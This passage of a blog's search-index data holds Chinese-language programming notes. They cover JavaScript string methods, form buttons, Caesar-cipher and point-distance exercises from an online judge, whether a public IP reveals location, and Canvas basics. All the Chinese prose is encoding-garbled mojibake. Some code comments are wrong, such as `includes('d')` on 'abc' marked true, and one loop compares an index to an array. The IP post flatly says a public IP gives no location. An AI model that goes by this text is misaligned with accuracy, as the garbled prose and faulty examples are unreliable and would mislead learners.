99console.log(String.fromCharCode(ASCII1)) // aconsole.log(String.fromCharCode(ASCII2)) // bconsole.log(String.fromCharCode(ASCII3)) // c String.toUpperCase(str) å­—ä¸²è½‰å¤§å¯«String.toLowerCase(str) å­—ä¸²è½‰å°å¯« ã€Œéè‹±æ–‡å­—æ¯ã€çš„å­—å…ƒä¸æœƒåšè½‰æ›ã€‚ 123456const Upper = 'abc'.toUpperCase()const Lower = 'ABC'.toLowerCase()const NotEn = '@123'.toUpperCase()console.log(Upper) // ABCconsole.log(Lower) // abcconsole.log(NotEn) // @123 String.endsWith(string) çµå°¾å­—ä¸²è·Ÿ string ç›¸ä¸ç›¸åŒã€‚ 1234567const str = 'abc'console.log(str.endsWith('c')) // trueconsole.log(str.endsWith('bc')) // trueconsole.log(str.endsWith('abc')) // trueconsole.log(str.endsWith('abc ')) // falseconsole.log(str.endsWith(' abc')) // falseconsole.log(str.endsWith('')) // true String.padEnd(string, targetLength, padSting) æŠŠå¡«å……æ–‡å­—å¡åˆ°åŸå­—ä¸²ï¼Œç›´åˆ°çµæœé•·åº¦ç‚ºæ­¢ è£œå……ï¼š å¦‚æœæ²’æœ‰å¡«å……æ–‡å­—ï¼Œè‡ªå‹•ä»¥ã€Œç©ºæ ¼ã€ä¾†ä»£æ›¿ å¦‚æœå¡«å……æ–‡å­—ç‚ºã€Œç©ºå­—ä¸²ã€ï¼Œå›å‚³åŸå­—ä¸² å¦‚æœã€Œçµæœé•·åº¦ &lt;= åŸå­—ä¸²é•·åº¦ã€ï¼Œå›å‚³åŸå­—ä¸² 123456const str = 'abc'console.log(str.padEnd(10,'a')) // 'abcaaaaaaa'console.log(str.padEnd(10,'dog')) // 'abcdogdogd'console.log(str.padEnd(2,'abbc')) // 'abc'console.log(str.padEnd(10,'')) // 'abc'console.log(str.padEnd(10)) // 'abc ' String.indexOf(string) æœå°‹ string å‡ºç¾ä½ç½®çš„ç´¢å¼•å€¼ï¼ˆç¬¬ä¸€å€‹å­—å…ƒï¼‰ï¼Œä¸å­˜åœ¨å‰‡å›å‚³ -1 1234567const str = 'hello how are you today.'const n1 = str.indexOf('hello')const n2 = str.indexOf('today')const n3 = str.indexOf('tomorrow')console.log(n1) // 0console.log(n2) // 18console.log(n3) // -1 String.includes(str) çœ‹ String æœ‰æ²’æœ‰åŒ…å« strï¼Œæœ‰çš„è©±å›å‚³ trueï¼Œæ²’æœ‰å›å‚³ false è£œå……ï¼š æœ‰åˆ†å¤§å°å¯« åœ¨ String æœ‰å€¼çš„å‰æä¸‹ï¼Œstr ä»£ç©ºå­—ä¸²æ°¸é å›å‚³ true 123456const str = 'abc'console.log(str.includes('a')) // trueconsole.log(str.includes('ab')) // trueconsole.log(str.includes('abc')) // trueconsole.log(str.includes('d')) // trueconsole.log(str.includes('')) // true å°æŠ€å·§ï¼šå¯ä»¥åå‘æ“ä½œï¼Œåˆ¤æ–·å‚³å…¥çš„ str æ˜¯å¦ã€Œæ˜¯ç©ºå­—ä¸²ã€ 1234const empty = ''// æ„æ€æ˜¯èªª abc è·Ÿ '' æ˜¯å¦åœ¨ã€Œç©ºå­—ä¸²ã€è£¡é¢ï¼Ÿconsole.log(empty.includes('abc')) // falseconsole.log(empty.includes('')) // true ç”šè‡³ä¹Ÿå¯ä»¥ç”¨ NOT (!) ä¾†åˆ¤æ–·å‚³å…¥çš„ str æ˜¯å¦ã€Œä¸æ˜¯ç©ºå­—ä¸²ã€ï¼š 1234const empty = ''// æ„æ€æ˜¯èªª abc è·Ÿ '' æ˜¯å¦åœ¨ã€Œéç©ºå­—ä¸²ã€è£¡é¢ï¼Ÿconsole.log(!(empty).includes('abc')) // trueconsole.log(!(empty).includes('')) // false String.replace(str, replace) æŠŠ str æ›æˆ replaceã€‚åªæœƒæŠŠç¬¬ä¸€å€‹ç¬¦åˆçš„å°è±¡çµ¦æ›¿æ›ï¼Œ 123const str = 'yoyoyoyooooyoyyyo'const n1 = str.replace('y', '!')console.log(n1) // !oyoyoyooooyoyyyo å¦‚æœè¦æŠŠæ¯å€‹ç¬¦åˆçš„éƒ½æ”¹æ‰å¾—ç”¨ regExpï¼š 123const str = 'yoyoyoyooooyoyyyo'const n1 = str.replace(/y/g, '!')console.log(n1) // !o!o!o!oooo!o!!!o String.replaceAll(str, replace) æŠŠæ‰€æœ‰çš„ str æ›æˆ replaceã€‚ 123const str = 'yoyoyoyooooyoyyyo'const n1 = str.replaceAll('y', '!')console.log(n1) // !o!o!o!oooo!o!!!o String.split(separator) å°å­—ä¸²åˆ†å‰²ï¼Œå›å‚³ä¸€å€‹ Array 123const str = '1y2y3y4y5'const n1 = str.split('y')console.log(n1) // [ '1', '2', '3', '4', '5' ] æ³¨æ„ä¸€ä¸‹å¦‚æœ separator çš„å‰é¢æ²’æœ‰å­—ä¸²ï¼Œæœƒè‡ªå‹•æŠŠç©ºå­—ä¸²å¡«å…¥é™£åˆ—ï¼š ï¼ˆå› ç‚ºåˆ†å‰²çš„ä½ç½®é‚„æ²’æœ‰ä»»ä½•çš„å­—å…ƒï¼‰ 123const str = 'yyyy1y2y3y4y5y'const n1 = str.split('y')console.log(n1) // [ '', '', '', '', '1', '2', '3', '4', '5', ''] å¦å¤–ï¼Œseparator ä¹Ÿå¯ä»¥æ˜¯æ­£å‰‡è¡¨é”å¼ï¼š 123const str = 'yo2yoy3oyo1o'const n1 = str.split(/[0-9]/)console.log(n1) // [ 'yo', 'yoy', 'oyo', 'o' ] String.trim å»æ‰å­—ä¸²é ­å°¾çš„ç©ºæ ¼ï¼ˆä¸ç®¡æœ‰å¹¾å€‹ï¼‰ 123const str = ' yooooo 'const n1 = str.trim()console.log(n1) // 'yooooo' String.substring(start, end) å›å‚³æŒ‡å®šç¯„åœçš„å­—ä¸²ï¼ˆä¸å« endï¼‰ è£œå……ï¼šè·Ÿ slice çš„å·®åˆ¥åœ¨ substring ä¸å¯ä»¥æŒ‡å®šã€Œè² å€¼ã€ å°æŠ€å·§ï¼šä¸æŒ‡å®š end çš„è©±æœƒè‡ªå‹•ç®—åˆ°æœ€å¾Œä¸€å€‹å­— 12345const str = 'abcdefg'const result1 = str.substring(1, 5)const result2 = str.substring(3)console.log(result1) // bcdeconsole.log(result2) // defg String.slice(start, end) å›å‚³æŒ‡å®šç¯„åœçš„å­—ä¸²ï¼ˆä¸å« endï¼‰ 123const str = 'Today is a good day';console.log(str.slice(0, 5)) // Today console.log(str.slice(6)); // is a good day å°æŠ€å·§ï¼šè¼¸å…¥è² æ•¸ä»£è¡¨ã€Œå¾å¾Œé¢æ•¸ä¾†ç¬¬ n å€‹å­—ã€ 123const str = 'Today is a good day';console.log(str.slice(0, -4)) // Today is a goodconsole.log(str.slice(-3)) // day","link":"/2021/12/20/built-in-function-string/"},{"title":"æ”¾åœ¨ form è£¡é¢çš„ button","text":"è·Ÿé è¨­è¡Œç‚ºæœ‰é—œã€‚ å•é¡Œå¦‚æœæœ‰å€‹ &lt;form&gt; è£¡é¢æ”¾äº†ä¸€å€‹ &lt;button&gt;ï¼Œæœƒç™¼ç¾æŒ‰ä¸‹æŒ‰éˆ•æ™‚ï¼Œè¡¨å–®æœƒè‡ªå‹•é€å‡ºã€‚ 123&lt;form action=\"http://a.com\"&gt; &lt;button&gt;send&lt;/button&gt;&lt;/form&gt; åŸå› èˆ‡è§£æ³•é€™æ˜¯å› ç‚ºå¦‚æœæ²’æœ‰å° &lt;button&gt; åš type çš„è¨­å®šçš„è©±ï¼Œé è¨­æœƒè¨­æˆ type=\"submit\"ã€‚ å¦‚æœä¸è¦é€å‡ºè¡¨å–®çš„åŠŸèƒ½ï¼Œåªè¦æŒ‡å®š type=\"button\" å°±ä¸æœƒè‡ªå‹•é€å‡ºäº†ã€‚","link":"/2022/01/06/button-inside-form/"},{"title":"å‡±è–©åŠ å¯†","text":"ä¾†è‡ª LIOJ ä¸Šçš„é¡Œç›®ï¼Œé€™é¡Œå¯¦ä½œçš„æ±è¥¿è »æœ‰è¶£çš„ï¼Œè€Œä¸”é€™æ¬¡æƒ³åˆ°äº†ä¸åŒçš„è§£æ³•ï¼Œæ‰€ä»¥æƒ³è¨˜éŒ„ä¸‹ä¾†ã€‚ è§£é¡Œæ–¹å‘é€™ä¸€é¡Œåªè¦æŠŠå­—ä¸²è½‰æˆå°æ‡‰çš„ ASCII CODEï¼Œå†åŠ ä¸Šä½ç§»é‡å°±å¯ä»¥åšåˆ°ä½ç§»çš„å‹•ä½œã€‚å”¯ä¸€è¦æ³¨æ„çš„æ˜¯ç¯„åœåœ¨ 97 ~ 122 ä¹‹é–“ã€‚ æ‰€ä»¥é€™ä¸€é¡Œçš„é›£é»åœ¨æ–¼ï¼šç•¶ä½ç§»å¾Œçš„æ•¸å­—è¶…é 122 æ™‚æ€éº¼è™•ç†ï¼Ÿ è§£æ³•ä¸€ While è¿´åœˆæ³•é€™ç¨®è§£æ³•æ‡‰è©²æ˜¯æ¯”è¼ƒç›´è¦ºçš„æƒ³æ³•ï¼š 12345678910111213141516171819202122232425function solve(lines) { // ä½ç§»é‡ const n = lines[0] * 1 // åŸå­—ä¸² const str = lines[1] console.log(caesarCipher1(str, n))}function caesarCipher1(s, n) { let result = '' for(let i=0; i&lt;s.length; i++) { // å–å¾— ASCII CODE const code = s.charCodeAt(i) // ä½ç§»å¾Œçš„æ•¸å­— let m = code + n // å–é¤˜æ•¸ + 96 ç›´åˆ° &lt;= 122 ç‚ºæ­¢ while(m &gt; 122) { // åŠ ä¸Š 96 æ˜¯å› ç‚º a å¾ 97 é–‹å§‹ m = (m % 122) + 96 } // è½‰å›æ–‡å­— result += String.fromCharCode(m) } return result} é€™è£¡å¦‚æœæ²’æœ‰æ³¨æ„çš„è©±æœƒä¸å°å¿ƒæŠŠ while(m &gt; 122) å¯«æˆ if(m &gt; 122)ã€‚ é€™æ¨£æ˜¯ä¸å°çš„ï¼Œå› ç‚ºç•¶ n çš„å€¼å¤§æ–¼ 26 æ™‚ï¼Œ(m % 122) + 96 çš„å€¼å°±æœƒè¶…é 122ï¼Œèˆ‰å€‹ä¾‹å­ï¼š 1234567// å‡è¨­ n ç‚º 27let code = 122let m = code + 27if(m &gt; 122) { m = (m % 122) + 96}console.log(m) // 123 æ‰€ä»¥ä¸€å®šè¦ç”¨ while ä¾†è™•ç†ï¼Œæ‰èƒ½ç¢ºä¿ m ä¸€å®šè½åœ¨ 97 ~ 122 é€™å€‹ç¯„åœã€‚ è§£æ³•ä¸€ å–é¤˜æ•¸å¤§æ³•é€™ä¸€å€‹è§£æ³•å¦‚æœæƒ³é€šå¾Œæœƒè¦ºå¾—å¾ˆç›´è¦ºã€‚ é¦–å…ˆï¼Œä½ çŸ¥é“è‹±æ–‡å­—æ¯ç¸½å…±åªæœ‰ 26 å€‹ï¼Œæ¥è‘—ä½ å†æƒ³æƒ³ä¸‹é¢é€™å…©å€‹æ¡ˆä¾‹ï¼š å¦‚æœå¾€å³ä½ç§» 26 æ¬¡ï¼Œæ˜¯ä¸æ˜¯å°±ç­‰æ–¼æ²’æœ‰å‹•ï¼Ÿ å¦‚æœå¾€å³ç§» 27 æ¬¡ï¼Œæ˜¯ä¸æ˜¯å°±ç­‰åŒå¾€å³ç§» 1 æ¬¡ï¼Ÿ å¾é€™å…©å€‹æ¡ˆä¾‹ä¸­æ‡‰è©²èƒ½ç™¼ç¾ä¸€äº›äº‹æƒ…å§ï¼Ÿ æ²’éŒ¯ï¼Œæˆ‘å€‘åªè¦æŠŠã€Œä½ç§»é‡ % 26ã€ï¼Œå°±å¯ä»¥æ±‚å‡ºå¯¦éš›è¦ä½ç§»çš„æ¬¡æ•¸ã€‚ æ‰€ä»¥å…¶å¯¦åªè¦æŠŠç¬¬ä¸€ç¨®è§£æ³•ç¨å¾®ä¿®æ”¹ä¸€ä¸‹å°±å¥½äº†ï¼š 12345678910111213141516171819202122232425function solve(lines) { // ä½ç§»é‡ const n = lines[0] * 1 // åŸå­—ä¸² const str = lines[1] console.log(caesarCipher2(str, n))}function caesarCipher2(s, n) { let result = '' for(let i=0; i&lt;s.length; i++) { // å–å¾— ASCII CODE const code = s.charCodeAt(i) // code + å¯¦éš›çš„ä½ç§»é‡ let m = code + (n % 26) // å¦‚æœè¶…å‡ºç¯„åœ if(m &gt; 122) { // å–é¤˜æ•¸ï¼Œä¸¦åŠ ä¸Š 96ï¼Œå› ç‚º a å¾ 97 é–‹å§‹ m = (m % 122) + 96 } // è½‰å›æ–‡å­— result += String.fromCharCode(m) } return result} å¯ä»¥æ³¨æ„åˆ° while è®Šæˆäº† ifã€‚ é€™æ˜¯å› ç‚ºç¾åœ¨çš„ n çµ•å°ä¸æœƒè¶…é 26 é€™å€‹ç¯„åœï¼Œä¹Ÿå°±æ˜¯èªª (m % 122) + 96 å€¼çµ•å°ä¸æœƒè¶…é 122ï¼Œæ‰€ä»¥é€™å€‹å‹•ä½œåªè¦åšä¸€æ¬¡å°±å¤ äº†ã€‚ é›–ç„¶ä¸çŸ¥é“é€™è§£æ³•å°å¯¦éš›æ•ˆèƒ½çš„å½±éŸ¿å¦‚ä½•ï¼Œä½†èƒ½æ‹¿æ‰è¿´åœˆçœ‹äº†å°±æ˜¯èˆ’æœï¼","link":"/2021/12/28/caesar-cipher/"},{"title":"å¹³é¢è·é›¢è¨ˆç®—","text":"ä¾†è‡ª LIOJ ä¸Šçš„é¡Œç›®ï¼Œé€™ä¸€é¡Œæœ€é›£çš„åœ°æ–¹åœ¨æ–¼ã€Œè®€å–è³‡æ–™ã€çš„æ–¹å¼ï¼Œæ‰€ä»¥æƒ³è¨˜éŒ„ä¸‹ä¾†ã€‚ å¤§æ–¹å‘ ç¸½å…±æœ‰å¹¾çµ„åº§æ¨™è³‡æ–™ï¼ˆæ¯çµ„æœ‰ 4 å€‹å€¼ï¼‰ æ€éº¼å–å¾—æƒ³è¦çš„è³‡æ–™ ç¸½å…±æœ‰å¹¾çµ„åº§æ¨™è³‡æ–™å¯ä»¥å¾ lines[0] å¾—çŸ¥è¿´åœˆè¦è·‘å¹¾åœˆï¼Œæ‰€ä»¥æœ€å¤–å±¤çš„çµæ§‹æœƒæ˜¯ï¼š 123for(let i=0; i&lt;Number(lines[0]); i++) { ...} æ€éº¼å–å¾—æƒ³è¦çš„è³‡æ–™æ¥è‘—å°±æ˜¯æœ€éº»ç…©çš„åœ°æ–¹äº†ï¼Œè¦æ€éº¼åœ¨æ¯ä¸€åœˆè£¡é¢å»å–å¾—å°æ‡‰çš„ 4 å€‹åº§æ¨™ï¼Ÿ é—œæ–¼é€™é»ä½ å¯ä»¥å…ˆåšå€‹å‡è¨­ï¼ŒæŠŠæ¯ä¸€åœˆä½ å¸Œæœ›å–å¾—çš„è³‡æ–™å¯«å‡ºä¾†ï¼š 12345678910111213141516171819i=0 // ç¬¬ä¸€çµ„lines[1]lines[2]lines[3]lines[4]i=1 // ç¬¬äºŒçµ„lines[5]lines[6]lines[7]lines[8]i=2 // ç¬¬ä¸‰çµ„lines[9]lines[10]lines[11]lines[12]... å¯ä»¥å…ˆæ³¨æ„åˆ°ï¼Œæ¯ä¸€åœˆéƒ½æœƒå›ºå®šæ˜¯ 4 ç­†è³‡æ–™ï¼Œæ‰€ä»¥åªè¦å°ˆæ³¨åœ¨ç¬¬ä¸€å€‹ lines çš„å€¼å°±å¥½ï¼Œå…¶ä»–çš„å¯ä»¥ç”¨ +1 +2 +3 çš„æ–¹å¼ä¾†å–å¾—ï¼Œæ‰€ä»¥ï¼š i=0 çš„æ™‚å€™ï¼Œç¬¬ä¸€å€‹ lines å€¼è¦æ˜¯ 1 i=1 çš„æ™‚å€™ï¼Œç¬¬ä¸€å€‹ lines å€¼è¦æ˜¯ 5 i=2 çš„æ™‚å€™ï¼Œç¬¬ä¸€å€‹ lines å€¼è¦æ˜¯ 9 æ¥è‘—é€™éƒ¨åˆ†å¯ä»¥åƒè€ƒ å°å‡ºæ˜Ÿæ˜Ÿï¼ˆé‡‘å­—å¡”ï¼‰ è£¡é¢æåˆ°çš„æ–¹æ³•ï¼Œç”¨ã€Œæ•¸å­¸å‡½æ•¸ã€çš„æ–¹å¼ä¾†æ±‚å‡ºå…¬å¼ï¼š 123f(i) = f(0) = 1f(i) = f(1) = 5f(i) = f(2) = 9 å¾é€™è£¡å¯ä»¥ç™¼ç¾è¦å¾‹æ˜¯ ã€Œæ¯ä¸€åœˆéƒ½æœƒå¢åŠ  4ã€ï¼Œä¹Ÿå°±æ˜¯èªªï¼Œæ¯ä¸€åœˆéƒ½è¦ x4ï¼š 1234f(i) = i * 4f(0) = 0f(1) = 4f(2) = 8 ç•¶å¯«åˆ°é€™è£¡å¾Œä½ æ‡‰è©²ä¹Ÿèƒ½ç™¼ç¾ï¼Œåªè¦åœ¨ +1 å°±å¯ä»¥å¯¦ç¾æˆ‘å€‘çš„ç›®æ¨™ï¼š 1234f(i) = i * 4 + 1f(0) = 1f(1) = 5f(2) = 9 å¦‚æœçœŸçš„æ²’æœ‰é ­ç·’ï¼Œé‚£å¦³å¯ä»¥ç”¨æœ€ç¬¨çš„æ–¹æ³•ï¼Œå°±æ˜¯ä¸€å€‹ä¸€å€‹è©¦ï¼š 1234567891011121314151617181920212223242526272829303132f(i) = i * 1f(0) = 0f(1) = 1f(2) = 2f(i) = i * 2f(0) = 0f(1) = 2f(2) = 4f(i) = i * 3f(0) = 0f(1) = 3f(2) = 6// åœ¨é€™é‚Šçš„æ™‚å€™ï¼Œä½ å°±æœƒç™¼ç¾åªè¦æ¯ä¸€é …åœ¨ + 1 å°±èƒ½ç¬¦åˆè¦å¾‹f(i) = i * 4 + 1f(0) = 0 + 1 =&gt; 1f(1) = 4 + 1 =&gt; 5f(2) = 5 + 1 =&gt; 9// é€™é‚Šé›–ç„¶çœ‹èµ·ä¾†å¯ä»¥æŠŠç¬¬ä¸‰é … -1ï¼Œä½†æ˜¯ç¬¬ä¸€å€‹ 0 è·Ÿç¬¬äºŒå€‹ 5 çš„éƒ¨åˆ†æœƒä¸ç¬¦åˆï¼Œæ‰€ä»¥æ²’æœ‰è¾¦æ³•f(i) = i * 5f(0) = 0f(1) = 5f(2) = 10// ä¹‹å¾Œå°±æ›´ä¸å¯èƒ½äº†ï¼Œæ‰€ä»¥ä¸æœƒå†å¾€ä¸‹åšf(i) = i * 6f(0) = 0f(1) = 6f(2) = 12 æ‰€ä»¥æœ€å¾Œæ±‚å‡ºçš„å…¬å¼å°±æ˜¯ i * 4 + 1ã€‚ è§£é¡Œåœ¨æ±‚å‡ºè¦å¾‹å¾Œï¼Œè¦è§£å‡ºé€™é¡Œå°±ä¸å›°é›£äº†ï¼Œæ‰€ä»¥é€™è£¡ç›´æ¥é™„ä¸ŠåŸå§‹ç¢¼ï¼š 1234567891011121314151617181920212223function solve(lines) { // è½‰æˆæ•¸å­— const arr = lines.map(value =&gt; value * 1) // ç¸½å…±æœ‰å¹¾çµ„ const total = arr[0] // from 0 to 1 for(let i=0; i&lt;total; i++) { // i=0ï¼Œstart=1 // i=1ï¼Œstart=5 // i=2ï¼Œstart=9 const start = i*4 + 1 const x1 = arr[start] * 1 // lines[1] const y1 = arr[start+1] * 1 // lines[2] const x2 = arr[start+2] * 1 // lines[3] const y2 = arr[start+3] * 1 // lines[4] console.log(calculateDistance(x1, y1, x2, y2)) // 1.41 } }function calculateDistance(x1, y1, x2, y2) { const x = (x1-x2) ** 2 const y = (y1-y2) ** 2 return Math.sqrt(x + y).toFixed(2)} Bonus æˆ‘åŸæœ¬çš„è§£æ³•æˆ‘åŸæœ¬çš„æƒ³æ³•æ¯”è¼ƒå–®ç´”ï¼Œæˆ‘å¸Œæœ›ï¼š calculateDistance æœƒæ¥æ”¶ä¸€å€‹é™£åˆ—ç•¶ä½œåƒæ•¸ï¼Œä¸¦è¨ˆç®—è·é›¢ å»ºç«‹ä¸€å€‹å·¢ç‹€é™£åˆ—ï¼Œè£¡é¢å„²å­˜æ¯ä¸€çµ„çš„åº§æ¨™é™£åˆ—ï¼Œä¾‹å¦‚èªª [[1, 1, 2, 2], [3, 3, 4, 4]] éæ­·å·¢ç‹€é™£åˆ—ï¼ŒæŠŠä¸€çµ„é™£åˆ—éƒ½ä¸Ÿçµ¦ calculateDistance è¨ˆç®—å‡ºè·é›¢ ç°¡å–®ä¾†èªªå¤§æ¦‚å°±æ˜¯é€™æ¨£çš„æ¶æ§‹ï¼š 1234const nestedArray = [[1, 1, 2, 2], [3, 3, 4, 4]]for(let i=0; i&lt;nestedArray; i++) { console.log(calculateDistance(nestedArray[i]))} æ‰€ä»¥åªè¦å¯¦ä½œå‡ºä¸€å€‹å¯ä»¥æŠŠ [1, 1, 2, 2, 3, 3, 4, 4] è½‰æˆå·¢ç‹€é™£åˆ—çš„ function å°±å¯ä»¥äº†ã€‚ é€™è£¡å°±ä¸ç´°èªªæ€éº¼å¯¦ä½œï¼Œç›´æ¥åƒè€ƒåŸå§‹ç¢¼ä¸­çš„è¨»è§£è£¡æ‡‰è©²å°±èƒ½ç†è§£ï¼š 123456789101112131415161718192021function createNestedArray(arr, unit=4) { // æ‹·è²åŸé™£åˆ— const copyArr = [...arr] // å„²å­˜æœ€å¾Œçš„çµæœ const result = [] // å»ºç«‹ç¾¤çµ„ while(copyArr.length !== 0) { // æš«å­˜é™£åˆ— const tempArr = [] // unit æ˜¯å¤šå°‘å°±æœƒæ¨å¤šå°‘å€‹å…ƒç´ åˆ° tempArr // ( é è¨­æ˜¯ 4 å€‹ ) for(let i=0; i&lt;unit; i++) { tempArr.push(copyArr[i]) } // æ¨å›ç¾¤çµ„é™£åˆ— result.push(tempArr) // æ›´æ–°é™£åˆ—å…§å®¹ copyArr.splice(0, unit) } return result} æœ€å¾Œåªè¦æŠŠæ•´å€‹æ¶æ§‹çµ„åˆèµ·ä¾†å°±å®Œæˆäº†ï¼Œé€™è£¡ä¸€æ¨£é™„ä¸ŠåŸå§‹ç¢¼ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243function solve(lines) { // è½‰æˆæ•¸å­— const temp = lines.map(value =&gt; value * 1) // ç§»é™¤ç¬¬ä¸€å€‹å…ƒç´  temp.splice(0,1) // å»ºç«‹ç¾¤çµ„é™£åˆ— =&gt; [[1, 1, 2, 2], [3, 3, 4, 4]] const group = createNestedArray(temp) // è¨ˆç®—æ¯ä¸€çµ„çš„è·é›¢ for(let i=0; i&lt;group.length; i++) { console.log(calculateDistance(group[i])) }}function createNestedArray(arr, unit=4) { // æ‹·è²åŸé™£åˆ— const copyArr = [...arr] // å„²å­˜æœ€å¾Œçš„çµæœ const result = [] // å»ºç«‹ç¾¤çµ„ while(copyArr.length !== 0) { // æš«å­˜é™£åˆ— const tempArr = [] // å„²å­˜å…ƒç´  for(let i=0; i&lt;unit; i++) { tempArr.push(copyArr[i]) } // æ¨å›ç¾¤çµ„é™£åˆ— result.push(tempArr) // æ›´æ–°é™£åˆ—å…§å®¹ copyArr.splice(0, unit) } return result}function calculateDistance(arr) { // x è»¸ const x = (arr[0]-arr[2]) ** 2 // y è»¸ const y = (arr[1]-arr[3]) ** 2 // é–‹æ ¹è™Ÿï¼Œå–å°æ•¸ç¬¬äºŒä½ const result = Math.sqrt(x+y).toFixed(2) // å›å‚³çµæœ return result} Bonus æ›´ç°¡æ½”çš„å¯«æ³•åªè¦æ‰¾å‡ºè¦å¾‹ï¼Œä¸¦æ­é…é™£åˆ—çš„å…§å»ºå‡½å¼ä»¥åŠè§£æ§‹è³¦å€¼ï¼Œå¯ä»¥å¯«å¾—è¶…ç°¡æ½”ï¼š 1234567891011121314151617181920212223242526function solve(lines) { // è½‰æˆæ•¸å­— const temp = lines.map(value =&gt; value * 1) // å…¨éƒ¨æœ‰å¹¾çµ„ const total = temp[0] // è¨ˆç®—æ¯ä¸€çµ„çš„è·é›¢ for(let i=0; i&lt;total; i++) { // i=0 =&gt; start=1 // i=1 =&gt; start=5 // i=2 =&gt; start=9 // ... let start = i*4+1 // i=0 =&gt; slice(1, 5) [1, 1, 2, 2] // i=1 =&gt; slice(5, 9) [3, 3, 4, 4] // ... // æ­é…è§£æ§‹è³¦å€¼å–å‡ºæ¯ä¸€é» const [x1, y1, x2, y2] = temp.slice(start, start+4) const distance = calculateDistance(x1, y1, x2, y2) console.log(distance) }}function calculateDistance(x1, y1, x2, y2) { const x = Math.pow(x1-x2, 2) const y = Math.pow(y1-y2, 2) return Math.sqrt(x+y).toFixed(2)}","link":"/2021/12/28/calculate-distance/"},{"title":"çŸ¥é“å¯¦é«” IP çš„è©±å¯ä»¥çŸ¥é“æˆ‘çš„ä½ç½®å—ï¼Ÿ","text":"æˆ‘åŸæœ¬ä¹Ÿè »å¥½å¥‡é€™å•é¡Œçš„ã€‚ ç°¡è¿°é›–ç„¶åœ¨ é—œæ–¼ IP åœ°å€ é€™ç¯‡æ–‡ç« è£¡æœ‰èªªéä¸€èˆ¬å®¶è£¡çš„ç¶²è·¯æ˜¯æ¡ç”¨ã€Œæµ®å‹• IP åœ°å€ã€ï¼Œä½†åŒæ™‚ä¹Ÿæœƒæœ‰ä¸€å€‹ã€Œå°å¤–å…¬é–‹çš„ IPï¼ˆå¯¦é«” IPï¼‰ã€ã€‚ é‚£éº¼ï¼Œç•¶åˆ¥äººçŸ¥é“æŸ¥åˆ°é€™å€‹ IP å¾Œï¼Œæ˜¯ä¸æ˜¯å°±èƒ½çŸ¥é“æˆ‘çš„ä½ç½®å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯ã€Œä¸æœƒã€ã€‚é€™é‚Šè§£é‡‹ä¸€ä¸‹åŸå› ï¼š å› ç‚ºå¯¦é«” IP çš„ä½ç½®å…¶å¯¦æ˜¯é›»ä¿¡å…¬å¸ï¼ˆISPï¼‰çš„æ©Ÿæˆ¿ä½ç½® ä½ å¯¦éš›åœ¨é€£ç¶²è·¯çš„æµç¨‹æ˜¯é€™æ¨£ï¼š å…ˆé€£åˆ°æˆ‘å®¶ Wifi å¾æˆ‘å®¶ Wifi é€£åˆ°é›»ä¿¡å…¬å¸ æœ€å¾Œå†å¾é›»ä¿¡å…¬å¸æ©Ÿæˆ¿é€£å‡ºå» https://google.com æ‰€ä»¥åªæœ‰é›»ä¿¡å…¬å¸å¯ä»¥æ‰¾å‡º IP å°æ‡‰çš„ User æ˜¯èª°ï¼Œé§­å®¢æ²’è¾¦æ³•ï¼ˆé™¤éä»–é§­å…¥é›»ä¿¡å…¬å¸ï¼‰ã€‚","link":"/2022/03/09/can-someone-get-my-position-by-ip/"},{"title":"Canvasï¼åŸºæœ¬ç¹ªè£½èˆ‡è¼¸å‡ºåœ–ç‰‡","text":"ä¸€ç›´éƒ½æ²’æ©Ÿæœƒç”¨åˆ°çš„ Canvasã€‚ ç›¸é—œ methodsé€šç”¨ï¼š fillRect ç•«å‡ºå¯¦å¿ƒçŸ©å½¢ strokeRect ç•«ç©ºå¿ƒçŸ©å½¢ clearRect æ¸…é™¤ç•«é¢ é€šå¸¸æœƒæ­é…ä¸€èµ·ä½¿ç”¨çš„ï¼š beginPath é–‹å•Ÿæ–°çš„ç¹ªåœ–è·¯å¾‘ moveTo åˆå§‹ä½ç½® lineTo çµæŸä½ç½® stroke ç•«å‡ºç·šæ¢è»Œè·¡ closePath é—œé–‰ç¹ªåœ–è·¯å¾‘ åœ°é›·ï¼šåŒæ¨£æ˜¯ width / heightï¼Œä½† HTML å’Œ CSS çš„æ„ç¾©ä¸åŒåœ¨ä½¿ç”¨ Canvas æ™‚å¯èƒ½æœƒæƒ³è¦è¨­å®šç•«å¸ƒçš„å¯¬è·Ÿé«˜ï¼Œæ‰€ä»¥å¯èƒ½æœƒå¾ˆç›´è¦ºçš„ç”¨ CSS ä¾†è¨­å®šï¼Œä¸éé€™æ¨£çš„å¯«æ³•è·Ÿç›´æ¥å¯«åœ¨ HTML å±¬æ€§ä¸Šçš„æ„ç¾©ä¸ä¸€æ¨£ï¼Œç›´æ¥ä¾†çœ‹å€‹ç¯„ä¾‹ï¼š 123456789101112&lt;canvas id=\"canvas1\" width=\"50\" height=\"100\"&gt;&lt;/canvas&gt;&lt;canvas id=\"canvas2\" width=\"50\" height=\"100\" style=\"width: 100px\"&gt;&lt;/canvas&gt;&lt;script&gt; ctx1 = canvas1.getContext('2d') ctx2 = canvas2.getContext('2d') ctx1.fillStyle = 'dodgerblue' ctx2.fillStyle = 'dodgerblue' // åœ¨å…©å€‹ canvas ä¸­éƒ½ç•«ä¸ŠåŒæ¨£å¤§å°çš„æ–¹å¡Š ctx1.fillRect(10, 10, 30, 30) ctx2.fillRect(10, 10, 30, 30)&lt;/script&gt; æ³¨æ„é€™å…©å€‹ canvas çš„å…§å®¹å¹¾ä¹ä¸€æ¨£ï¼Œåªåœ¨å·® canvas2 å¤šåœ¨ CSS ä¸­è¨­å®šäº† width: 100pxï¼Œæœ€å¾Œå‡ºä¾†çš„çµæœå¦‚ä¸‹ï¼š é™„è¨»ï¼šCodepen çœ‹åˆ°å·®ç•°äº†å—ï¼Ÿcanvas2 çš„è—è‰²æ–¹å¡Šç›´æ¥è¢«æ”¾å¤§äº†ä¸€å€ã€‚é€™æ˜¯å› ç‚º HTML çš„å¯¬é«˜æ˜¯ç”¨ä¾†è¨­å®š Canvas å…§éƒ¨çš„åº§æ¨™å’Œç¶²æ ¼ç³»çµ±ï¼Œè€Œ CSS å‰‡æ˜¯ç”¨ä¾†è¨­å®šå¯¦éš›å‘ˆç¾åœ¨ç•«å¸ƒä¸Šçš„å¯¦éš›å¤§å°ã€‚ ä»¥ä¸Šé¢çš„ä¾‹å­ä¾†èªªçš„è©±ï¼Œå¯ä»¥æƒ³æˆæ˜¯ canvas2 åœ¨ Canvas å…§éƒ¨çš„åŸæœ¬å¤§å°æ˜¯ 50 